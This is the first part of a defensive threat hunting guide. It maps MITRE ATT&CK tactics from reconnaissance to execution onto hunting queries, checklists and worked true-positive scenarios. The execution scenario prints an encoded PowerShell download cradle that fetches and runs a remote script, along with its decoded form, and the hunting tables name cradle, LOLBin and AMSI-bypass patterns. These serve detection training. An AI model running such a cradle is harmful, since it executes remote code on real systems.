# 🎯 Threat Hunting SOC Guide — Part 1: MITRE ATT&CK Framework, Methodologies & Tactics (Recon → Execution)

---

# PART 1: THREAT HUNTING FUNDAMENTALS & MITRE ATT&CK MAPPED INVESTIGATIONS

---

## 1. What Is Threat Hunting?

### 1.1 Definition

Threat hunting is the **proactive, hypothesis-driven** process of searching through networks, endpoints, and datasets to detect threats that evade existing automated security solutions (SIEM rules, EDR signatures, IDS/IPS). Unlike reactive SOC operations (alert triage), threat hunting **assumes compromise** and actively looks for evidence of adversary activity.

### 1.2 Threat Hunting vs. Alert Triage

| Aspect | Alert Triage (Reactive) | Threat Hunting (Proactive) |
|--------|------------------------|---------------------------|
| **Trigger** | Automated alert fires | Hypothesis or intelligence-driven |
| **Approach** | Investigate what the system detected | Search for what the system **missed** |
| **Mindset** | "Is this alert real?" | "What threats are hiding in our environment?" |
| **Scope** | Single alert/event | Environment-wide or campaign-focused |
| **Output** | TP/FP verdict + response | New detections, IOCs, improved visibility |
| **Frequency** | Continuous (as alerts come in) | Scheduled or triggered by intel |
| **Skill Level** | L1-L2 SOC Analysts | L2-L3 Analysts, Threat Hunters |
| **Tools** | SIEM, EDR alerts | SIEM queries, EDR telemetry, threat intel, custom scripts |

### 1.3 The Three Hunting Models

```
┌──────────────────────────────────────────────────────────────────────┐
│                    THREAT HUNTING MODELS                              │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. INTEL-DRIVEN (Reactive Hunting)                                  │
│     ├─ Triggered by: New threat intelligence (IOCs, reports, CVEs)   │
│     ├─ Method: Search for known IOCs across environment              │
│     ├─ Example: New APT report → search for their known C2 IPs      │
│     └─ Maturity Level: Beginner                                     │
│                                                                      │
│  2. HYPOTHESIS-DRIVEN (Proactive Hunting)                            │
│     ├─ Triggered by: Analyst intuition + MITRE ATT&CK knowledge     │
│     ├─ Method: Formulate hypothesis → test against data             │
│     ├─ Example: "Attackers may be using LOLBins for lateral movement"│
│     └─ Maturity Level: Intermediate                                  │
│                                                                      │
│  3. DATA-DRIVEN (Analytics-Based)                                    │
│     ├─ Triggered by: Statistical anomalies in baseline data          │
│     ├─ Method: Machine learning, baselining, outlier detection       │
│     ├─ Example: Anomalous DNS query volume from a single host        │
│     └─ Maturity Level: Advanced                                      │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 2. MITRE ATT&CK Framework — Overview for Threat Hunters

### 2.1 What Is MITRE ATT&CK?

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally accessible knowledge base of adversary behavior based on real-world observations. It categorizes **what** adversaries do (Tactics), **how** they do it (Techniques), and specific **implementations** (Sub-techniques/Procedures).

### 2.2 ATT&CK Matrix Structure

```
┌───────────────────────────────────────────────────────────────────────────┐
│                        MITRE ATT&CK ENTERPRISE MATRIX                     │
├───────────────────────────────────────────────────────────────────────────┤
│                                                                           │
│   TACTICS (WHY — the adversary's goal)                                    │
│   └─ TECHNIQUES (HOW — the method used to achieve the goal)              │
│       └─ SUB-TECHNIQUES (SPECIFIC — variation of the technique)          │
│           └─ PROCEDURES (IMPLEMENTATION — real-world group usage)         │
│                                                                           │
│   Example:                                                                │
│   Tactic:         Credential Access                                       │
│   Technique:      OS Credential Dumping (T1003)                          │
│   Sub-Technique:  LSASS Memory (T1003.001)                               │
│   Procedure:      APT28 uses Mimikatz to dump LSASS credentials         │
│                                                                           │
└───────────────────────────────────────────────────────────────────────────┘
```

### 2.3 The 14 ATT&CK Tactics (Enterprise)

| # | Tactic ID | Tactic | Goal | Key Techniques |
|---|-----------|--------|------|----------------|
| 1 | TA0043 | **Reconnaissance** | Gather info for planning | Active/Passive scanning, Phishing for info |
| 2 | TA0042 | **Resource Development** | Establish resources for operations | Acquire infrastructure, Develop capabilities |
| 3 | TA0001 | **Initial Access** | Get into the network | Phishing, Exploit public-facing app, Valid accounts |
| 4 | TA0002 | **Execution** | Run malicious code | PowerShell, WMI, Scripting, Scheduled tasks |
| 5 | TA0003 | **Persistence** | Maintain foothold | Registry Run keys, Scheduled tasks, Account creation |
| 6 | TA0004 | **Privilege Escalation** | Gain higher-level permissions | Token manipulation, Exploitation, UAC bypass |
| 7 | TA0005 | **Defense Evasion** | Avoid detection | Obfuscation, Disabling security, Masquerading |
| 8 | TA0006 | **Credential Access** | Steal credentials | Credential dumping, Keylogging, Brute force |
| 9 | TA0007 | **Discovery** | Explore the environment | Network scanning, Account discovery, System info |
| 10 | TA0008 | **Lateral Movement** | Move through the environment | RDP, SMB, PsExec, WinRM |
| 11 | TA0009 | **Collection** | Gather target data | Screen capture, Keylogging, Email collection |
| 12 | TA0011 | **Command and Control** | Communicate with implants | DNS tunneling, HTTPS C2, Domain fronting |
| 13 | TA0010 | **Exfiltration** | Steal data out | Exfil over C2, Exfil to cloud, Scheduled transfer |
| 14 | TA0040 | **Impact** | Disrupt/Destroy | Ransomware, Data destruction, Defacement |

### 2.4 How Threat Hunters Use MITRE ATT&CK

```
┌──────────────────────────────────────────────────────────────────────┐
│           MITRE ATT&CK FOR THREAT HUNTING WORKFLOW                   │
├──────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. MAP DETECTION COVERAGE                                           │
│     ├─ Overlay your SIEM/EDR detections on ATT&CK Matrix            │
│     ├─ Identify GAPS (tactics/techniques with NO detection)          │
│     └─ Prioritize hunting in unmonitored areas                       │
│                                                                      │
│  2. FORMULATE HUNTING HYPOTHESES                                     │
│     ├─ Pick a tactic/technique relevant to your threat model        │
│     ├─ "If adversary does T1059.001 (PowerShell), what traces?"     │
│     └─ Design queries to find those traces                           │
│                                                                      │
│  3. INVESTIGATE RESULTS                                              │
│     ├─ Analyze returned data for true adversary behavior             │
│     ├─ Eliminate false positives (system admins, automation)         │
│     └─ Correlate findings with other tactics in kill chain          │
│                                                                      │
│  4. CREATE / IMPROVE DETECTIONS                                      │
│     ├─ Convert hunting findings into automated SIEM rules           │
│     ├─ Write Sigma rules or KQL queries                              │
│     └─ Document in detection engineering backlog                     │
│                                                                      │
│  5. REPORT & ITERATE                                                 │
│     ├─ Document hunting results (positive or negative)              │
│     ├─ Share IOCs and TTPs with SOC and threat intel team            │
│     └─ Update threat model and repeat cycle                          │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘
```

---

## 3. Threat Hunting Process — Step by Step

### 3.1 The Hunting Cycle

```
    ┌──────────────┐
    │  1. CREATE    │◄────────────────────────────────┐
    │  HYPOTHESIS   │                                  │
    └──────┬───────┘                                  │
           │                                          │
           ▼                                          │
    ┌──────────────┐                                  │
    │ 2. GATHER    │                                  │
    │ DATA/LOGS    │                                  │
    └──────┬───────┘                                  │
           │                                          │
           ▼                                          │
    ┌──────────────┐                                  │
    │ 3. RUN       │                                  │
    │ ANALYTICS    │                                  │
    └──────┬───────┘                                  │
           │                                          │
           ▼                                          │
    ┌──────────────┐         ┌──────────────┐        │
    │ 4. ANALYZE   │────────►│ 5. FINDINGS? │        │
    │ RESULTS      │         │              │        │
    └──────────────┘         └──────┬───────┘        │
                                    │                 │
                              YES   │   NO            │
                               │    │    │            │
                               ▼    │    ▼            │
                         ┌─────────┐│ ┌─────────┐    │
                         │ CREATE  ││ │ REFINE   │    │
                         │ DETECT/ ││ │ HYPOTHESIS│────┘
                         │ RESPOND ││ │ & QUERY  │
                         └─────────┘│ └─────────┘
                                    │
                               ▼    │
                         ┌─────────┐
                         │DOCUMENT │
                         │& SHARE  │
                         └─────────┘
```

### 3.2 Hypothesis Construction Framework

| Component | Description | Example |
|-----------|-------------|---------|
| **Threat Actor** | Who might attack us? | APT29; Ransomware gang; Insider threat |
| **Tactic** | What is their goal? | Persistence; Credential Access |
| **Technique** | How would they achieve it? | T1053 - Scheduled Task; T1003 - Credential Dumping |
| **Data Source** | What logs show this behavior? | Windows Event Logs, EDR telemetry, Sysmon |
| **Expected Evidence** | What would we see in the data? | New scheduled tasks created by non-admin users |
| **Baseline** | What is normal? | IT admin creates scheduled tasks for patching |

**Example Hypothesis:**
> "An adversary may have established persistence in our environment by creating scheduled tasks (T1053.005) to execute malicious payloads. I will search for recently created scheduled tasks by non-standard accounts, created outside of change windows, pointing to unusual binary paths."

### 3.3 Key Data Sources for Hunting

| Data Source | What It Captures | Key Event IDs / Logs |
|-------------|-----------------|---------------------|
| **Windows Event Logs** | Authentication, process execution, PowerShell | 4624, 4625, 4688, 4672, 4720, 4732, 7045 |
| **Sysmon** | Process creation, network connections, file creation | Event 1 (Process Create), 3 (Network), 7 (Image Loaded), 11 (File Create), 13 (Registry) |
| **EDR Telemetry** | Endpoint behavior, process trees, file modifications | CrowdStrike, Defender for Endpoint, SentinelOne |
| **Firewall/Proxy Logs** | Network connections, URL requests, blocked traffic | Connection logs, URL filtering logs |
| **DNS Logs** | Domain resolution queries | Query logs, response logs |
| **Cloud Logs** | Azure AD/Entra, AWS CloudTrail, GCP Audit | Sign-in logs, API calls, IAM changes |
| **Email Logs** | Email flow, attachments, URL clicks | Exchange message trace, SEG logs |
| **Network Flow** | NetFlow/IPFIX data, packet captures | Source/Dest IP, ports, bytes, duration |

---

## 4. MITRE ATT&CK Tactic-by-Tactic Hunting Guide

### 4.1 TA0043 — Reconnaissance

#### Overview
Adversaries gather information about the target before attacking. While most recon happens externally (outside your network), you can detect **active reconnaissance** like port scanning and responses to information-gathering emails.

#### Key Techniques

| Technique ID | Technique | Description |
|-------------|-----------|-------------|
| T1595 | Active Scanning | Port scanning, vulnerability scanning from external IPs |
| T1589 | Gather Victim Identity Info | Harvesting employee names, emails, credentials from public sources |
| T1590 | Gather Victim Network Info | Identifying IP ranges, domains, DNS records |
| T1591 | Gather Victim Org Info | Business relationships, physical locations, roles |
| T1598 | Phishing for Information | Spear-phishing emails designed to gather intel (not deliver malware) |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| External port scanning | Firewall/IDS | High volume of connection attempts from single external IP to multiple ports |
| Reconnaissance phishing | Email gateway | Emails requesting org chart, contact info, technology stack details |
| Web scraping of public assets | Web server logs | Unusual crawling patterns on career pages, leadership pages |
| DNS reconnaissance | DNS logs | High volume of DNS queries for subdomains from external source (subdomain enumeration) |

#### ✅ True Positive Scenario — Active Scanning Detected

**Scenario:** Firewall logs show an external IP (`185.220.101.x`) sent SYN packets to 500+ ports on your DMZ server within 5 minutes.

**Investigation Steps:**
```
1. CONFIRM THE ACTIVITY
   □ Review firewall logs for the source IP
   □ Confirm high port-scan volume (> 100 ports in < 10 min)
   □ Identify targeted assets (what servers/ranges were scanned)

2. ENRICH THE SOURCE IP
   □ Check AbuseIPDB, VirusTotal, Shodan for source IP reputation
   □ Check if IP belongs to known threat actor infrastructure
   □ Check if IP is a TOR exit node or VPN provider
   □ Geolocate the IP

3. ASSESS IMPACT
   □ Were any ports open/responsive?
   □ Did the scanner find any vulnerable services?
   □ Were there follow-up exploitation attempts?
   □ Check IDS/IPS for signature-based alerts from same IP

4. RESPOND
   □ Block the source IP at perimeter firewall
   □ Add IP to threat intel watchlist
   □ Notify vulnerability management team of scanned assets
   □ Verify patch status of exposed services
   □ Monitor for follow-up activity from same IP range

5. DOCUMENT
   □ Log finding in threat hunting report
   □ Create SIEM correlation rule for future scans from this range
   □ Update threat model with targeting information
```

**TP Confidence:** 🔴 HIGH — External entity actively scanning your infrastructure is always a TP for reconnaissance.

---

### 4.2 TA0042 — Resource Development

#### Overview
Adversaries establish infrastructure, acquire tools, and prepare capabilities before the attack. This tactic is **mostly undetectable** from within the target's environment but can be observed through:
- Newly registered domains mimicking your brand
- Infrastructure associated with known threat actors

#### Key Techniques

| Technique ID | Technique | Description |
|-------------|-----------|-------------|
| T1583 | Acquire Infrastructure | Register domains, rent VPS, buy IP ranges |
| T1584 | Compromise Infrastructure | Hack legitimate servers for C2 |
| T1587 | Develop Capabilities | Build custom malware, exploits |
| T1588 | Obtain Capabilities | Download tools like Cobalt Strike, Mimikatz |
| T1585 | Establish Accounts | Create accounts for social engineering |
| T1586 | Compromise Accounts | Take over legitimate accounts for use in ops |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Lookalike domains | Domain monitoring service | Newly registered domains similar to your brand name (typosquats, homoglyphs) |
| Staged tools/payloads | Threat intel feeds | Known malicious tools hosted on infrastructure matching your threat model |
| Compromised infrastructure | Passive DNS | Legitimate domains suddenly resolving to suspicious IPs |

#### ✅ True Positive Scenario — Lookalike Domain Registered

**Scenario:** Domain monitoring service alerts that `yourcompany-login.com` was registered 2 days ago. Passive DNS shows it resolves to a known bulletproof hosting provider.

**Investigation Steps:**
```
1. CONFIRM THE DOMAIN
   □ WHOIS lookup: registrar, registrant (often privacy-protected), creation date
   □ Passive DNS: what IPs does it resolve to?
   □ Check if the domain has MX records (email-capable)
   □ Check if a website is hosted (credential harvesting page?)

2. ASSESS RISK
   □ Does the domain mimic your login portal?
   □ Is MX configured to send/receive email (BEC risk)?
   □ Has it been used in phishing campaigns already?
   □ Check URLScan.io for any captures of the domain

3. RESPOND
   □ Submit takedown request to registrar
   □ Add domain to email gateway and web proxy blocklists
   □ Create SIEM alert for any internal connections to this domain
   □ Notify phishing awareness team
   □ Check if any employees have already visited this domain (proxy logs)

4. PROACTIVE
   □ Acquire similar variations yourself (defensive registration)
   □ Set up ongoing monitoring for brand-impersonating domains
```

**TP Confidence:** 🔴 HIGH — Lookalike domain targeting your org with active infrastructure is confirmed resource development.

---

### 4.3 TA0001 — Initial Access

#### Overview
Adversaries use various methods to gain initial foothold in the target network. This is where most attacks become **detectable by SOC teams**.

#### Key Techniques

| Technique ID | Technique | Description | Common Detection Source |
|-------------|-----------|-------------|------------------------|
| T1566 | Phishing | Spear-phishing emails with links/attachments | Email gateway, SIEM |
| T1566.001 | Phishing: Attachment | Malicious file attached to email | Email gateway, EDR |
| T1566.002 | Phishing: Link | Malicious URL in email body | Email gateway, Proxy |
| T1190 | Exploit Public-Facing App | Exploit vulnerabilities in web apps, VPN, RDP | WAF, IDS/IPS, App logs |
| T1133 | External Remote Services | Abuse VPN, RDP, Citrix for access | Auth logs, VPN logs |
| T1078 | Valid Accounts | Use stolen/compromised credentials | Auth logs, UEBA |
| T1199 | Trusted Relationship | Abuse supply chain / partner connections | Network logs, Auth logs |
| T1195 | Supply Chain Compromise | Compromise software supply chain | Endpoint, Integrity monitoring |
| T1189 | Drive-by Compromise | Exploit browser via compromised website | Proxy, EDR, IDS |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Phishing delivery | Email logs | Emails with suspicious attachments (.iso, .img, .lnk, .hta, .vbs) from external senders |
| Exploitation attempts | WAF/IDS logs | SQL injection, path traversal, RCE attempts against public apps |
| Credential stuffing | Auth logs | High volume of failed logins from single IP/IP range against multiple accounts |
| VPN brute force | VPN logs | Repeated authentication failures → eventual success |
| Compromised credentials | SIEM/UEBA | Successful login from unusual geo, impossible travel, new device+location |
| Supply chain | EDR | Signed software executing unexpected child processes |

#### ✅ True Positive Scenario — Phishing with Malicious Attachment (T1566.001)

**Scenario:** SEG quarantined an email with a `.iso` file attached. Subject: "Q4 Financial Review — URGENT". Sender domain `finance-reports-2024.com` was registered 3 days ago.

**Investigation Steps:**
```
1. EMAIL ANALYSIS
   □ Full header analysis: Return-Path, X-Originating-IP, auth results
   □ WHOIS on sender domain: age < 30 days → 🔴
   □ SPF/DKIM/DMARC status → likely all fail
   □ Check if email reached any mailboxes (bypass quarantine?)

2. ATTACHMENT ANALYSIS
   □ Calculate file hash (SHA256)
   □ Check hash on VirusTotal → any detections?
   □ Submit to sandbox (Any.Run, Hybrid Analysis)
   □ Mount the .iso → what files are inside? (.lnk? .exe? .dll?)
   □ Check for hidden files, double extensions
   □ Analyze any scripts/macros inside

3. SCOPE ASSESSMENT
   □ How many recipients received this email?
   □ Search for similar subject lines, sender domains, attachment hashes
   □ Check if any user interacted (clicked, opened, mounted)
   □ If mounted: check EDR for child process execution

4. RESPOND (if TP confirmed)
   □ Purge email from all mailboxes
   □ Block sender domain and IP at email gateway
   □ Block attachment hash at EDR
   □ If user interacted: isolate endpoint, initiate IR
   □ Submit IOCs to threat intel platform
   □ Alert organization with phishing advisory

5. DETECTION IMPROVEMENT
   □ Create/tune rule for .iso attachment detection
   □ Add domain to blocklist
   □ Review and strengthen attachment filtering policies
```

**TP Confidence:** 🔴 HIGH — New domain + weaponized attachment + urgency language + financial lure = confirmed phishing.

#### ✅ True Positive Scenario — Valid Accounts (T1078) — Compromised Credentials

**Scenario:** UEBA flags a successful login for `john.doe@corp.com` from Nigeria at 3:00 AM, followed by mailbox rule creation forwarding all emails to an external Gmail address. John is based in New York and was logged in from his office 2 hours prior.

**Investigation Steps:**
```
1. VERIFY IMPOSSIBLE TRAVEL
   □ Check Azure AD/Entra sign-in logs: timestamps, IPs, geolocations
   □ Confirm John's last known legitimate login and location
   □ Calculate travel distance and time → impossible?
   □ Check if IP is known VPN/proxy/TOR exit node

2. CHECK POST-LOGIN ACTIVITY
   □ Review mailbox rules: forwarding, delete, move rules created
   □ Review sent items: any mass emails or phishing sent?
   □ Check for OAuth app consent grants
   □ Check for password/MFA changes
   □ Review Azure AD audit logs: role changes, app registrations

3. CONFIRM COMPROMISE
   □ Contact John via out-of-band communication (phone call)
   □ Ask if he traveled or used VPN
   □ If NOT John → CONFIRMED COMPROMISE

4. RESPOND
   □ Revoke all active sessions (Azure AD: Revoke-AzureADUserAllRefreshToken)
   □ Reset password immediately
   □ Reset MFA registration
   □ Remove malicious inbox rules
   □ Block the external forwarding address
   □ Review and revert any unauthorized changes
   □ Check if credentials were exposed in known breaches (HaveIBeenPwned)

5. SCOPE EXPANSION
   □ Search for similar impossible travel events for other users
   □ Check if any other accounts logged in from the same Nigerian IP
   □ Review VPN/SSO logs for related anomalies
   □ Check if password spray preceded this login
```

**TP Confidence:** 🔴 HIGH — Impossible travel + inbox rule forwarding to external address = confirmed account compromise.

---

### 4.4 TA0002 — Execution

#### Overview
After gaining access, adversaries execute malicious code. This is one of the **most detectable** tactics because it generates rich telemetry in endpoint logs.

#### Key Techniques

| Technique ID | Technique | Description | Key Detection |
|-------------|-----------|-------------|---------------|
| T1059.001 | PowerShell | Execute PS commands/scripts | Event 4104 (Script Block), Sysmon 1 |
| T1059.003 | Windows Command Shell | cmd.exe execution | Sysmon 1, Event 4688 |
| T1059.005 | Visual Basic (VBA) | Macro execution in Office | EDR, Event 4688 (child of WINWORD.EXE) |
| T1059.007 | JavaScript/JScript | .js execution via wscript/cscript | Sysmon 1, EDR |
| T1047 | WMI (WMIC) | Remote execution via WMI | Event 4688, Sysmon 1 (wmiprvse.exe) |
| T1053.005 | Scheduled Task | Task scheduler for execution | Event 4698, Sysmon 1 (schtasks.exe) |
| T1204.001 | User Execution: Link | User clicks malicious link | Proxy logs, EDR |
| T1204.002 | User Execution: File | User opens malicious file | EDR, Sysmon 1 |
| T1569.002 | System Services: Service | Create service to run code | Event 7045, 4697 |
| T1106 | Native API | Direct API calls (NtCreateThread) | EDR, API monitoring |

#### 🔍 Hunting Queries & What to Look For

| Hunt | Data Source | What to Search |
|------|-------------|---------------|
| Suspicious PowerShell | Windows Events (4104, 4103) | Encoded commands (-enc), download cradles (IEX, Invoke-WebRequest), AMSI bypass |
| Office spawning processes | EDR/Sysmon | WINWORD.EXE → cmd.exe, powershell.exe, mshta.exe, wscript.exe |
| LOLBin execution | EDR/Sysmon | mshta.exe, regsvr32.exe, certutil.exe, rundll32.exe with unusual arguments |
| WMI remote execution | Event 4688/Sysmon | wmic.exe /node: process call create |
| Suspicious scheduled tasks | Event 4698 | Tasks created by non-admin users, pointing to TEMP/AppData paths |
| Script execution | Sysmon Event 1 | cscript.exe or wscript.exe running .js, .vbs, .wsf files from user directories |

#### ✅ True Positive Scenario — Malicious PowerShell Execution (T1059.001)

**Scenario:** SIEM alert fires on PowerShell Script Block Logging (Event 4104). A workstation executed:
```powershell
powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==
```

**Investigation Steps:**
```
1. DECODE THE COMMAND
   □ Base64 decode the -Enc value
   □ Decoded: IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.10/payload.ps1')
   □ This is a classic download cradle → 🔴 MALICIOUS

2. ANALYZE EXECUTION CONTEXT
   □ What user ran this? (domain\user from Event 4688)
   □ What was the parent process? (explorer.exe? outlook.exe? winword.exe?)
   □ When did it execute? (during business hours or off-hours?)
   □ What endpoint is this? (workstation, server, admin jump box?)

3. CHECK NETWORK ACTIVITY
   □ Did the host connect to 192.168.1.10? (is this internal or external?)
   □ Was payload.ps1 downloaded successfully?
   □ What did the payload contain? (if captured by proxy/PCAP)
   □ Check for subsequent outbound connections (C2)

4. ENDPOINT INVESTIGATION
   □ Check process tree in EDR: what spawned after PowerShell?
   □ Check for persistence mechanisms created (scheduled tasks, registry)
   □ Check for credential access (LSASS access, SAM dump)
   □ Check for lateral movement (RDP, SMB, WMI connections)
   □ Check for file drops in TEMP, AppData, ProgramData

5. RESPOND
   □ Isolate the endpoint immediately
   □ Capture forensic image if required
   □ Block the C2 IP/domain at firewall and proxy
   □ Kill the malicious process tree
   □ Reset user credentials
   □ Scan for persistence artifacts and remove
   □ Hunt for same IOCs across the environment
```

**TP Confidence:** 🔴 CRITICAL — Encoded PowerShell download cradle with hidden window = confirmed malicious execution.

#### ✅ True Positive Scenario — Office Document Spawns Child Process (T1204.002 + T1059.005)

**Scenario:** EDR alerts that `WINWORD.EXE` spawned `cmd.exe`, which then launched `powershell.exe` on a Finance department workstation. The user opened an email attachment named `Invoice_Details.docm`.

**Investigation Steps:**
```
1. PROCESS TREE ANALYSIS
   □ Map the full process chain:
     OUTLOOK.EXE → WINWORD.EXE → cmd.exe → powershell.exe
   □ This is a CLASSIC macro-enabled document attack chain → 🔴
   □ Check PowerShell command line arguments
   □ Check if PowerShell made network connections

2. DOCUMENT ANALYSIS
   □ Retrieve the .docm file (from email quarantine or endpoint)
   □ Calculate file hash → check VirusTotal
   □ Extract and analyze VBA macros (olevba, oletools)
   □ Look for: AutoOpen/Document_Open, Shell(), CreateObject, WScript
   □ Submit to sandbox for dynamic analysis

3. EMAIL ANALYSIS
   □ Who sent the email? External or compromised internal?
   □ Check sender domain reputation and age
   □ Were other users targeted with same attachment?

4. POST-EXECUTION HUNTING
   □ What did PowerShell download/execute?
   □ Check for new files created (Sysmon Event 11)
   □ Check for registry modifications (Sysmon Event 13)
   □ Check for network connections (Sysmon Event 3)
   □ Check for persistence mechanisms
   □ Check if LSASS was accessed (credential dumping)

5. RESPOND
   □ Isolate endpoint
   □ Purge email with same attachment hash from all mailboxes
   □ Block file hash at EDR and email gateway
   □ Block any C2 infrastructure identified
   □ Reset user credentials (assume compromised)
   □ Create detection for this document's IOCs
```

**TP Confidence:** 🔴 CRITICAL — Office application spawning command shell → PowerShell is textbook macro malware execution.

---

## 5. Investigation Checklist — Universal Template

### 5.1 General Threat Hunting Investigation Checklist

```
┌───────────────────────────────────────────────────────────────────────┐
│            UNIVERSAL THREAT HUNTING INVESTIGATION CHECKLIST            │
├───────────────────────────────────────────────────────────────────────┤
│                                                                       │
│  PHASE 1: INITIAL TRIAGE (First 15 minutes)                          │
│  □ What triggered the hunt? (Intel, hypothesis, anomaly)              │
│  □ What assets are involved? (hosts, users, services)                │
│  □ What is the potential MITRE ATT&CK tactic/technique?              │
│  □ What data sources are available for investigation?                 │
│  □ Is there an active threat requiring immediate containment?         │
│                                                                       │
│  PHASE 2: DATA COLLECTION (30 minutes)                               │
│  □ Pull relevant logs from SIEM (time-bounded queries)               │
│  □ Review EDR telemetry for affected endpoints                       │
│  □ Check network logs (firewall, proxy, DNS, NetFlow)                │
│  □ Review authentication logs (AD, VPN, cloud IdP)                   │
│  □ Collect threat intelligence on any IOCs found                     │
│                                                                       │
│  PHASE 3: ANALYSIS (1-2 hours)                                       │
│  □ Construct timeline of events                                      │
│  □ Map activity to MITRE ATT&CK techniques                          │
│  □ Identify all affected systems and users                           │
│  □ Determine if this is isolated or part of a campaign               │
│  □ Differentiate legitimate activity from malicious (TP vs FP)       │
│  □ Identify root cause / initial access vector                       │
│  □ Assess lateral movement scope                                     │
│  □ Check for persistence mechanisms                                  │
│  □ Look for data staging or exfiltration indicators                  │
│                                                                       │
│  PHASE 4: VERDICATION & SCOPE                                        │
│  □ Confirm TP with supporting evidence                               │
│  □ Assess total blast radius (all affected assets)                   │
│  □ Determine severity (Critical/High/Medium/Low)                     │
│  □ Identify all IOCs (IPs, domains, hashes, file paths, user agents)│
│                                                                       │
│  PHASE 5: RESPONSE                                                    │
│  □ Contain: Isolate affected systems, block IOCs                     │
│  □ Eradicate: Remove persistence, malware, unauthorized access       │
│  □ Recover: Restore systems, reset credentials, verify integrity     │
│  □ Submit IOCs to threat intel platforms                              │
│                                                                       │
│  PHASE 6: DOCUMENTATION & IMPROVEMENT                                 │
│  □ Document full investigation timeline and findings                 │
│  □ Record all IOCs and TTPs observed                                 │
│  □ Create/update SIEM detection rules                                │
│  □ Write Sigma/YARA rules for future detection                       │
│  □ Update threat model and hunting backlog                           │
│  □ Conduct lessons learned                                           │
│  □ Share intelligence with peer organizations (if applicable)        │
│                                                                       │
└───────────────────────────────────────────────────────────────────────┘
```

### 5.2 Key Evidence to Collect Per MITRE Tactic

| Tactic | Key Evidence to Collect |
|--------|------------------------|
| **Initial Access** | Email headers, attachment hashes, sender domain WHOIS, proxy logs for URL clicks |
| **Execution** | Process creation logs (Sysmon 1, 4688), PowerShell 4104, command line arguments |
| **Persistence** | Registry keys (Run, RunOnce), scheduled tasks (4698), services created (7045), startup folders |
| **Privilege Escalation** | Token manipulation artifacts, UAC bypass techniques, exploit evidence |
| **Defense Evasion** | Timestomping evidence, process injection, disabled security services |
| **Credential Access** | LSASS access logs, SAM database access, Kerberoasting tickets, brute force attempts |
| **Discovery** | Network scanning activity, nltest, whoami, net group commands |
| **Lateral Movement** | RDP connections (4624 Type 10), PsExec (7045), WMI (4688), SMB file access |
| **Collection** | File access logs, screen capture tools, keylogger artifacts, archive creation |
| **C2** | DNS queries, proxy logs, unusual beaconing patterns, encoded traffic |
| **Exfiltration** | Large data transfers, cloud upload logs, USB activity, encrypted archives |
| **Impact** | Ransomware notes, deleted shadow copies, destroyed logs, defacement evidence |

---

*Continued in Part 2 → Persistence, Privilege Escalation, Defense Evasion, Credential Access — Advanced TP Scenarios & Hunting Playbooks*
